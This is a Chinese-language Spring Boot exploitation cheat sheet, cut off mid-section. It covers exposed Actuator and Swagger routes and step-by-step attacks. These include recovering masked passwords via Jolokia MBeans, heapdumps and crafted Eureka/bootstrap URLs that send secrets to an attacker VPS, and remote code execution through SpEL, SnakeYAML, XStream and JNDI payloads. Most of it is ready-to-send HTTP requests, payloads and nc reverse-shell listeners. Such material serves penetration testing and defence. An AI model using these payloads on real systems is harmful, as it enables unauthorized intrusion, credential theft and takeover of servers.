[{"id":"f5a81cc3188fd765faea5ed43a886140","title":"Spring Boot Vulnerability Exploit Check List","content":"Spring Boot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list\n目录\n\nSpring Boot Vulnerability Exploit Check List\n\n零：路由和版本\n\n0x01：路由知识\n\n0x02：版本知识\n\n组件版本的相互依赖关系：\n\nSpring Cloud 与 Spring Boot 版本之间的依赖关系：\n\nSpring Cloud 小版本号的后缀及含义:\n\n\n\n\n\n一：信息泄露\n\n0x01：路由地址及接口调用详情泄漏\n\n0x02：配置不当而暴露的路由\n\n0x03：获取被星号脱敏的密码的明文 (方法一)\n\n利用条件：\n\n利用方法：\n\n步骤一： 找到想要获取的属性名\n\n步骤二： jolokia 调用相关 Mbean 获取明文\n\n\n\n\n\n0x04：获取被星号脱敏的密码的明文 (方法二)\n\n利用条件：\n\n利用方法：\n\n步骤一： 找到想要获取的属性名\n\n步骤二： 使用 nc 监听 HTTP 请求\n\n步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性\n\n步骤四： 刷新配置\n\n步骤五： 解码属性值\n\n\n\n\n\n0x05：获取被星号脱敏的密码的明文 (方法三)\n\n利用条件：\n\n利用方法：\n\n步骤一： 找到想要获取的属性名\n\n步骤二： 使用 nc 监听 HTTP 请求\n\n步骤三： 触发对外 http 请求\n\n步骤四： 刷新配置\n\n\n\n\n\n0x06：获取被星号脱敏的密码的明文 (方法四)\n\n利用条件：\n\n利用方法：\n\n步骤一： 找到想要获取的属性名\n\n步骤二： 下载 jvm heap 信息\n\n步骤三： 使用 MAT 获得 jvm heap 中的密码明文\n\n\n\n\n\n\n\n二：远程代码执行\n\n0x01：whitelabel error page SpEL RCE\n\n利用条件：\n\n利用方法：\n\n步骤一：找到一个正常传参处\n\n步骤二：执行 SpEL 表达式\n\n\n\n漏洞原理：\n\n漏洞分析：\n\n漏洞环境：\n\n\n\n0x02：spring cloud SnakeYAML RCE\n\n利用条件：\n\n利用方法：\n\n步骤一： 托管 yml 和 jar 文件\n\n步骤二： 设置 spring.cloud.bootstrap.location 属性\n\n步骤三： 刷新配置\n\n\n\n漏洞原理：\n\n漏洞分析：\n\n漏洞环境：\n\n\n\n0x03：eureka xstream deserialization RCE\n\n利用条件：\n\n利用方法：\n\n步骤一：架设响应恶意 XStream payload 的网站\n\n步骤二：监听反弹 shell 的端口\n\n步骤三：设置 eureka.client.serviceUrl.defaultZone 属性\n\n步骤四：刷新配置\n\n\n\n漏洞原理：\n\n漏洞分析：\n\n漏洞环境：\n\n\n\n0x04：jolokia logback JNDI RCE\n\n利用条件：\n\n利用方法：\n\n步骤一：查看已存在的 MBeans\n\n步骤二：托管 xml 文件\n\n步骤三：准备要执行的 Java 代码\n\n步骤四：架设恶意 ldap 服务\n\n步骤五：监听反弹 shell 的端口\n\n步骤六：从外部 URL 地址加载日志配置文件\n\n\n\n漏洞原理：\n\n漏洞分析：\n\n漏洞环境：\n\n\n\n0x05：jolokia Realm JNDI RCE\n\n利用条件：\n\n利用方法：\n\n步骤一：查看已存在的 MBeans\n\n步骤二：准备要执行的 Java 代码\n\n步骤三：托管 class 文件\n\n步骤四：架设恶意 rmi 服务\n\n步骤五：监听反弹 shell 的端口\n\n步骤六：发送恶意 payload\n\n\n\n漏洞原理：\n\n漏洞分析：\n\n漏洞环境：\n\n\n\n0x06：restart h2 database query RCE\n\n利用条件：\n\n利用方法：\n\n步骤一：设置 spring.datasource.hikari.connection-test-query 属性\n\n步骤二：重启应用\n\n\n\n漏洞原理：\n\n漏洞分析：\n\n漏洞环境：\n\n\n\n0x07：h2 database console JNDI RCE\n\n利用条件：\n\n利用方法：\n\n步骤一：访问路由获得 jsessionid\n\n步骤二：准备要执行的 Java 代码\n\n步骤三：托管 class 文件\n\n步骤四：架设恶意 ldap 服务\n\n步骤五：监听反弹 shell 的端口\n\n步骤六：发包触发 JNDI 注入\n\n\n\n漏洞分析：\n\n漏洞环境：\n\n\n\n0x08：mysql jdbc deserialization RCE\n\n利用条件：\n\n利用方法：\n\n步骤一：查看环境依赖\n\n步骤二：架设恶意 rogue mysql server\n\n步骤三：设置 spring.datasource.url 属性\n\n步骤四：刷新配置\n\n步骤五：触发数据库查询\n\n步骤六：恢复正常 jdbc url\n\n\n\n漏洞原理：\n\n漏洞分析：\n\n漏洞环境：\n\n\n\n0x09：restart logging.config logback JNDI RCE\n\n利用条件：\n\n利用方法：\n\n步骤一：托管 xml 文件\n\n步骤二：托管恶意 ldap 服务及代码\n\n步骤三：设置 logging.config 属性\n\n步骤四：重启应用\n\n\n\n漏洞原理：\n\n漏洞分析：\n\n漏洞环境：\n\n\n\n0x0A：restart logging.config groovy RCE\n\n利用条件：\n\n利用方法：\n\n步骤一：托管 groovy 文件\n\n步骤二：设置 logging.config 属性\n\n步骤三：重启应用\n\n\n\n漏洞原理：\n\n漏洞环境：\n\n\n\n0x0B：restart spring.main.sources groovy RCE\n\n利用条件：\n\n利用方法：\n\n步骤一：托管 groovy 文件\n\n步骤二：设置 spring.main.sources 属性\n\n步骤三：重启应用\n\n\n\n漏洞原理：\n\n漏洞环境：\n\n\n\n0x0C：restart spring.datasource.data h2 database RCE\n\n利用条件：\n\n利用方法：\n\n步骤一：托管 sql 文件\n\n步骤二：设置 spring.datasource.data 属性\n\n步骤三：重启应用\n\n\n\n漏洞原理：\n\n漏洞环境：\n\n\n\n\n\n\n\n\n零：路由和版本0x01：路由知识\n有些程序员会自定义 /manage、/management 、项目 App 相关名称为 spring 根路径\n\nSpring Boot Actuator 1.x 版本默认内置路由的起始路径为  / ，2.x 版本则统一以 /actuator 为起始路径\n\nSpring Boot Actuator 默认的内置路由名字，如 /env 有时候也会被程序员修改，比如修改成 /appenv\n\n\n0x02：版本知识\n\n\n\n\n\n\n\n\nSpring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。\n组件版本的相互依赖关系：\n\n\n\n依赖项\n版本列表及依赖组件版本\n\n\n\nspring-boot-starter-parent\nspring-boot-starter-parent\n\n\nspring-boot-dependencies\nspring-boot-dependencies\n\n\nspring-cloud-dependencies\nspring-cloud-dependencies\n\n\nSpring Cloud 与 Spring Boot 版本之间的依赖关系：\n\n\n\nSpring Cloud 大版本\nSpring Boot 版本\n\n\n\nAngel\n兼容 Spring Boot 1.2.x\n\n\nBrixton\n兼容 Spring Boot 1.3.x、1.4.x\n\n\nCamden\n兼容 Spring Boot 1.4.x、1.5.x\n\n\nDalston\n兼容 Spring Boot 1.5.x，不兼容 2.0.x\n\n\nEdgware\n兼容 Spring Boot 1.5.x，不兼容 2.0.x\n\n\nFinchley\n兼容 Spring Boot 2.0.x，不兼容 1.5.x\n\n\nGreenwich\n兼容 Spring Boot 2.1.x\n\n\nHoxton\n兼容 Spring Boot 2.2.x\n\n\nSpring Cloud 小版本号的后缀及含义:\n\n\n\n小版本号后缀\n含义\n\n\n\nBUILD-SNAPSHOT\n快照版，代码不是固定，处于变化之中\n\n\nMX\n里程碑版\n\n\nRCX\n候选发布版\n\n\nRELEASE\n正式发布版\n\n\nSRX\n(修复错误和 bug 并再次发布的)正式发布版\n\n\n一：信息泄露0x01：路由地址及接口调用详情泄漏\n\n\n\n\n\n\n\n\n开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等\n直接访问以下两个 swagger 相关路由，验证漏洞是否存在：\n&#x2F;v2&#x2F;api-docs\n&#x2F;swagger-ui.html\n\n\n其他一些可能会遇到的 swagger、swagger codegen、swagger-dubbo 等相关接口路由：\n&#x2F;swagger\n&#x2F;api-docs\n&#x2F;api.html\n&#x2F;swagger-ui\n&#x2F;swagger&#x2F;codes\n&#x2F;api&#x2F;index.html\n&#x2F;api&#x2F;v2&#x2F;api-docs\n&#x2F;v2&#x2F;swagger.json\n&#x2F;swagger-ui&#x2F;html\n&#x2F;distv2&#x2F;index.html\n&#x2F;swagger&#x2F;index.html\n&#x2F;sw&#x2F;swagger-ui.html\n&#x2F;api&#x2F;swagger-ui.html\n&#x2F;static&#x2F;swagger.json\n&#x2F;user&#x2F;swagger-ui.html\n&#x2F;swagger-ui&#x2F;index.html\n&#x2F;swagger-dubbo&#x2F;api-docs\n&#x2F;template&#x2F;swagger-ui.html\n&#x2F;swagger&#x2F;static&#x2F;index.html\n&#x2F;dubbo-provider&#x2F;distv2&#x2F;index.html\n&#x2F;spring-security-rest&#x2F;api&#x2F;swagger-ui.html\n&#x2F;spring-security-oauth-resource&#x2F;swagger-ui.html\n\n\n除此之外，下面的 spring boot actuator 相关路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：\n&#x2F;mappings\n&#x2F;metrics\n&#x2F;beans\n&#x2F;configprops\n&#x2F;actuator&#x2F;metrics\n&#x2F;actuator&#x2F;mappings\n&#x2F;actuator&#x2F;beans\n&#x2F;actuator&#x2F;configprops\n\n\n一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞，但是以 “默认安全“ 来讲，不暴露出这些信息更加安全。\n对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。\n0x02：配置不当而暴露的路由\n\n\n\n\n\n\n\n\n主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置\n参考 production-ready-endpoints 和 spring-boot.txt，可能因为配置不当而暴露的默认内置路由可能会有：\n&#x2F;actuator\n&#x2F;auditevents\n&#x2F;autoconfig\n&#x2F;beans\n&#x2F;caches\n&#x2F;conditions\n&#x2F;configprops\n&#x2F;docs\n&#x2F;dump\n&#x2F;env\n&#x2F;flyway\n&#x2F;health\n&#x2F;heapdump\n&#x2F;httptrace\n&#x2F;info\n&#x2F;intergrationgraph\n&#x2F;jolokia\n&#x2F;logfile\n&#x2F;loggers\n&#x2F;liquibase\n&#x2F;metrics\n&#x2F;mappings\n&#x2F;prometheus\n&#x2F;refresh\n&#x2F;scheduledtasks\n&#x2F;sessions\n&#x2F;shutdown\n&#x2F;trace\n&#x2F;threaddump\n&#x2F;actuator&#x2F;auditevents\n&#x2F;actuator&#x2F;beans\n&#x2F;actuator&#x2F;health\n&#x2F;actuator&#x2F;conditions\n&#x2F;actuator&#x2F;configprops\n&#x2F;actuator&#x2F;env\n&#x2F;actuator&#x2F;info\n&#x2F;actuator&#x2F;loggers\n&#x2F;actuator&#x2F;heapdump\n&#x2F;actuator&#x2F;threaddump\n&#x2F;actuator&#x2F;metrics\n&#x2F;actuator&#x2F;scheduledtasks\n&#x2F;actuator&#x2F;httptrace\n&#x2F;actuator&#x2F;mappings\n&#x2F;actuator&#x2F;jolokia\n&#x2F;actuator&#x2F;hystrix.stream\n\n\n其中对寻找漏洞比较重要接口的有：\n\n/env、/actuator/envGET 请求 /env 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；同时有一定概率可以通过 POST 请求 /env 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。\n\n/refresh、/actuator/refreshPOST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh 接口刷新属性变量来触发相关 RCE 漏洞。\n\n/restart、/actuator/restart暴露出此接口的情况较少；可以配合 POST请求 /env 接口设置属性后，再 POST 请求 /restart 接口重启应用来触发相关 RCE 漏洞。\n\n/jolokia、/actuator/jolokia可以通过 /jolokia/list 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。\n\n/trace、/actuator/httptrace一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。\n\n\n0x03：获取被星号脱敏的密码的明文 (方法一)\n\n\n\n\n\n\n\n\n访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果\n利用条件：\n\n目标网站存在 /jolokia 或 /actuator/jolokia 接口\n\n目标使用了 jolokia-core 依赖（版本要求暂未知）\n\n\n利用方法：\n步骤一： 找到想要获取的属性名\nGET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n步骤二： jolokia 调用相关 Mbean 获取明文\n将下面示例中的 security.user.password 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 value 键中。\n\n调用 org.springframework.boot Mbean\n\n\n\n\n\n\n\n\n\n\n实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法\nspring 1.x\nPOST &#x2F;jolokia\nContent-Type: application&#x2F;json\n\n&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name&#x3D;SpringApplication,type&#x3D;Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;jolokia\nContent-Type: application&#x2F;json\n\n&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name&#x3D;SpringApplication,type&#x3D;Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;\n\n\n调用 org.springframework.cloud.context.environment Mbean\n\n\n\n\n\n\n\n\n\n\n实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法\nspring 1.x\nPOST &#x2F;jolokia\nContent-Type: application&#x2F;json\n\n&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name&#x3D;environmentManager,type&#x3D;EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;jolokia\nContent-Type: application&#x2F;json\n\n&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name&#x3D;environmentManager,type&#x3D;EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;\n\n\n调用其他 Mbean\n\n\n\n\n\n\n\n\n\n\n目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。\n0x04：获取被星号脱敏的密码的明文 (方法二)利用条件：\n\n可以 GET 请求目标网站的 /env\n\n可以 POST 请求目标网站的 /env\n\n可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖）\n\n目标使用了 spring-cloud-starter-netflix-eureka-client 依赖\n\n目标可以请求攻击者的服务器（请求可出外网）\n\n\n利用方法：\n步骤一： 找到想要获取的属性名\nGET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n步骤二： 使用 nc 监听 HTTP 请求\n在自己控制的外网服务器上监听 80 端口：\nnc -lvk 80\n\n\n\n步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性\n将下面 http://value:$&#123;security.user.password&#125;@your-vps-ip  中的  security.user.password 换成自己想要获取的对应的星号 * 遮掩的属性名；your-vps-ip 换成自己外网服务器的真实 ip 地址。\nspring 1.x\nPOST &#x2F;env\nContent-Type: application&#x2F;x-www-form-urlencoded\n\neureka.client.serviceUrl.defaultZone&#x3D;http:&#x2F;&#x2F;value:$&#123;security.user.password&#125;@your-vps-ip\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;env\nContent-Type: application&#x2F;json\n\n&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;value:$&#123;security.user.password&#125;@your-vps-ip&quot;&#125;\n\n\n\n步骤四： 刷新配置\nspring 1.x\nPOST &#x2F;refresh\nContent-Type: application&#x2F;x-www-form-urlencoded\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;refresh\nContent-Type: application&#x2F;json\n\n\n\n步骤五： 解码属性值\n正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 Authorization 头内容：\nAuthorization: Basic dmFsdWU6MTIzNDU2\n\n\n将其中的 dmFsdWU6MTIzNDU2部分使用 base64 解码，即可获得类似明文值 value:123456，其中的 123456 即是目标星号 * 脱敏前的属性值明文。\n0x05：获取被星号脱敏的密码的明文 (方法三)利用条件：\n\n通过 POST /env 设置属性触发目标对外网指定地址发起任意 http 请求\n\n目标可以请求攻击者的服务器（请求可出外网）\n\n\n利用方法：\n\n\n\n\n\n\n\n\n\n参考 UUUUnotfound 提出的 ，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据\n步骤一： 找到想要获取的属性名\nGET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n步骤二： 使用 nc 监听 HTTP 请求\n在自己控制的外网服务器上监听 80 端口：\nnc -lvk 80\n\n\n\n步骤三： 触发对外 http 请求\n\nspring.cloud.bootstrap.location 方法（同时适用于明文数据中有特殊 url 字符的情况）\n\nspring 1.x\nPOST &#x2F;env\nContent-Type: application&#x2F;x-www-form-urlencoded\n\nspring.cloud.bootstrap.location&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;?&#x3D;$&#123;security.user.password&#125;\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;env\nContent-Type: application&#x2F;json\n\n&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;?&#x3D;$&#123;security.user.password&#125;&quot;&#125;\n\n\n\neureka.client.serviceUrl.defaultZone 方法（不适用于明文数据中有特殊 url 字符的情况）\n\nspring 1.x\nPOST &#x2F;env\nContent-Type: application&#x2F;x-www-form-urlencoded\n\neureka.client.serviceUrl.defaultZone&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;$&#123;security.user.password&#125;\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;env\nContent-Type: application&#x2F;json\n\n&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;$&#123;security.user.password&#125;&quot;&#125;\n\n\n\n\n步骤四： 刷新配置\nspring 1.x\nPOST &#x2F;refresh\nContent-Type: application&#x2F;x-www-form-urlencoded\n\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;refresh\nContent-Type: application&#x2F;json\n\n\n\n0x06：获取被星号脱敏的密码的明文 (方法四)\n\n\n\n\n\n\n\n\n访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果\n利用条件：\n\n可正常 GET 请求目标 /heapdump 或 /actuator/heapdump 接口\n\n利用方法：\n步骤一： 找到想要获取的属性名\nGET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n步骤二： 下载 jvm heap 信息\n\n\n\n\n\n\n\n\n\n下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G\nGET 请求目标的 /heapdump 或 /actuator/heapdump 接口，下载应用实时的 JVM 堆信息\n步骤三： 使用 MAT 获得 jvm heap 中的密码明文\n参考 文章 方法，使用 Eclipse Memory Analyzer 工具的 OQL 语句\nselect * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))\n\n或\n\nselect * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))\n\n\n辅助用 “password“ 等关键词快速过滤分析，获得密码等相关敏感信息的明文。\n二：远程代码执行\n\n\n\n\n\n\n\n\n由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准\n0x01：whitelabel error page SpEL RCE利用条件：\n\nspring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0\n\n至少知道一个触发 springboot 默认错误页面的接口及参数名\n\n\n利用方法：\n步骤一：找到一个正常传参处\n比如发现访问  /article?id=xxx ，页面会报状态码为 500 的错误： Whitelabel Error Page，则后续 payload 都将会在参数 id 处尝试。\n步骤二：执行 SpEL 表达式\n输入 /article?id=$&#123;7*7&#125; ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。由字符串格式转换成 0x** java 字节形式，方便执行任意代码：\n# coding: utf-8\n\nresult &#x3D; &quot;&quot;\ntarget &#x3D; &#39;open -a Calculator&#39;\nfor x in target:\n    result +&#x3D; hex(ord(x)) + &quot;,&quot;\nprint(result.rstrip(&#39;,&#39;))\n\n执行 open -a Calculator 命令\n$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72&#125;))&#125;\n\n\n\n漏洞原理：\n\nspring boot 处理参数值出错，流程进入 org.springframework.util.PropertyPlaceholderHelper 类中\n\n此时 URL 中的参数值会用 parseStringValue 方法进行递归解析\n\n其中  $&#123;&#125;  包围的内容都会被 org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration 类的 resolvePlaceholder 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞\n\n\n漏洞分析：\n​    SpringBoot SpEL表达式注入漏洞-分析与复现\n漏洞环境：\nrepository/springboot-spel-rce\n正常访问：\nhttp:&#x2F;&#x2F;127.0.0.1:9091&#x2F;article?id&#x3D;66\n\n\n执行 open -a Calculator 命令：\nhttp:&#x2F;&#x2F;127.0.0.1:9091&#x2F;article?id&#x3D;$&#123;T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]&#123;0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72&#125;))&#125;\n\n0x02：spring cloud SnakeYAML RCE利用条件：\n\n可以 POST 请求目标网站的 /env 接口设置属性\n\n可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖）\n\n目标依赖的 spring-cloud-starter 版本 &lt; 1.3.0.RELEASE\n\n目标可以请求攻击者的 HTTP 服务器（请求可出外网）\n\n\n利用方法：\n步骤一： 托管 yml 和 jar 文件\n在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server\n\npython2 -m SimpleHTTPServer 80\npython3 -m http.server 80\n\n在网站根目录下放置后缀为 yml 的文件  example.yml，内容如下：\n!!javax.script.ScriptEngineManager [\n  !!java.net.URLClassLoader [[\n    !!java.net.URL [&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.jar&quot;]\n  ]]\n]\n\n在网站根目录下放置后缀为 jar 的文件  example.jar，内容是要执行的代码，代码编写及编译方式参考 yaml-payload。\n步骤二： 设置 spring.cloud.bootstrap.location 属性\nspring 1.x\nPOST &#x2F;env\nContent-Type: application&#x2F;x-www-form-urlencoded\n\nspring.cloud.bootstrap.location&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.yml\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;env\nContent-Type: application&#x2F;json\n\n&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.yml&quot;&#125;\n\n\n\n\n步骤三： 刷新配置\nspring 1.x\nPOST &#x2F;refresh\nContent-Type: application&#x2F;x-www-form-urlencoded\n\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;refresh\nContent-Type: application&#x2F;json\n\n\n\n\n\n漏洞原理：\n\nspring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址\n\nrefresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容\n\nSnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作\n\n先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件\n\n然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化\n\n实例化类时执行恶意代码，造成 RCE 漏洞\n\n\n漏洞分析：\n​    Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记\n漏洞环境：\nrepository/springcloud-snakeyaml-rce\n正常访问：\nhttp:&#x2F;&#x2F;127.0.0.1:9092&#x2F;env\n\n\n0x03：eureka xstream deserialization RCE利用条件：\n\n可以 POST 请求目标网站的 /env 接口设置属性\n\n可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖）\n\n目标使用的  eureka-client &lt; 1.8.7（通常包含在 spring-cloud-starter-netflix-eureka-client 依赖中）\n\n目标可以请求攻击者的 HTTP 服务器（请求可出外网）\n\n\n利用方法：\n步骤一：架设响应恶意 XStream payload 的网站\n提供一个依赖 Flask 并符合要求的 python 脚本示例，作用是利用目标 Linux 机器上自带的 python 来反弹shell。\n使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。\n步骤二：监听反弹 shell 的端口\n一般使用 nc 监听端口，等待反弹 shell\nnc -lvp 443\n\n\n\n步骤三：设置 eureka.client.serviceUrl.defaultZone 属性\nspring 1.x\nPOST &#x2F;env\nContent-Type: application&#x2F;x-www-form-urlencoded\n\neureka.client.serviceUrl.defaultZone&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;env\nContent-Type: application&#x2F;json\n\n&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example&quot;&#125;\n\n\n\n\n步骤四：刷新配置\nspring 1.x\nPOST &#x2F;refresh\nContent-Type: application&#x2F;x-www-form-urlencoded\n\n\n\nspring 2.x\nPOST &#x2F;actuator&#x2F;refresh\nContent-Type: application&#x2F;json\n\n\n\n\n\n漏洞原理：\n\neureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址\n\nrefresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload\n\n目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞\n\n\n漏洞分析：\n​    Spring Boot Actuator从未授权访问到getshell\n漏洞环境：\nrepository/springboot-eureka-xstream-rce\n正常访问：\nhttp:&#x2F;&#x2F;127.0.0.1:9093&#x2F;env\n\n\n0x04：jolokia logback JNDI RCE利用条件：\n\n目标网站存在 /jolokia 或 /actuator/jolokia 接口\n\n目标使用了 jolokia-core 依赖（版本要求暂未知）并且环境中存在相关 MBean\n\n目标可以请求攻击者的 HTTP 服务器（请求可出外网）\n\n普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过\n\n\n利用方法：\n步骤一：查看已存在的 MBeans\n访问 /jolokia/list 接口，查看是否存在 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL 关键词。\n步骤二：托管 xml 文件\n在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server\n\npython2 -m SimpleHTTPServer 80\npython3 -m http.server 80\n\n在根目录放置以 xml 结尾的 example.xml  文件，内容如下：\n&lt;configuration&gt;\n  &lt;insertFromJNDI env-entry-name&#x3D;&quot;ldap:&#x2F;&#x2F;your-vps-ip:1389&#x2F;JNDIObject&quot; as&#x3D;&quot;appName&quot; &#x2F;&gt;\n&lt;&#x2F;configuration&gt;\n\n\n\n步骤三：准备要执行的 Java 代码\n编写优化过后的用来反弹 shell 的 Java 示例代码  JNDIObject.java，\n使用兼容低版本 jdk 的方式编译：\njavac -source 1.5 -target 1.5 JNDIObject.java\n\n然后将生成的 JNDIObject.class 文件拷贝到 步骤二 中的网站根目录。\n步骤四：架设恶意 ldap 服务\n下载 marshalsec ，使用下面命令架设对应的 ldap 服务：\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;your-vps-ip:80&#x2F;#JNDIObject 1389\n\n\n\n步骤五：监听反弹 shell 的端口\n一般使用 nc 监听端口，等待反弹 shell\nnc -lv 443\n\n\n\n步骤六：从外部 URL 地址加载日志配置文件\n\n\n\n\n\n\n\n\n\n⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。\n替换实际的 your-vps-ip 地址访问 URL 触发漏洞：\n&#x2F;jolokia&#x2F;exec&#x2F;ch.qos.logback.classic:Name&#x3D;default,Type&#x3D;ch.qos.logback.classic.jmx.JMXConfigurator&#x2F;reloadByURL&#x2F;http:!&#x2F;!&#x2F;your-vps-ip!&#x2F;example.xml\n\n\n\n\n漏洞原理：\n\n直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 ch.qos.logback.classic.jmx.JMXConfigurator 类的 reloadByURL 方法\n\n目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容\n\n目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 